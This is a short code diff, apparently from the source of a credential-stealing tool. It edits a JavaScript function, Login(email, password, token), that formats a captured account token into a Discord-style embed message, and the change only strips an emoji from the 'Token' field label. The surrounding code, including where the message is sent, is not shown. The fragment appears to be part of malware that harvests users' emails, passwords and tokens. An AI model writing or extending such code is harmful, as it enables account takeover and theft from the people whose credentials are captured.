@@ -149,7 +149,7 @@ function Login(email, password, token) {
                     "fields": [
                         
 			{
-                            "name": ":money_with_wings: **Token**",
+                            "name": " **Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         },
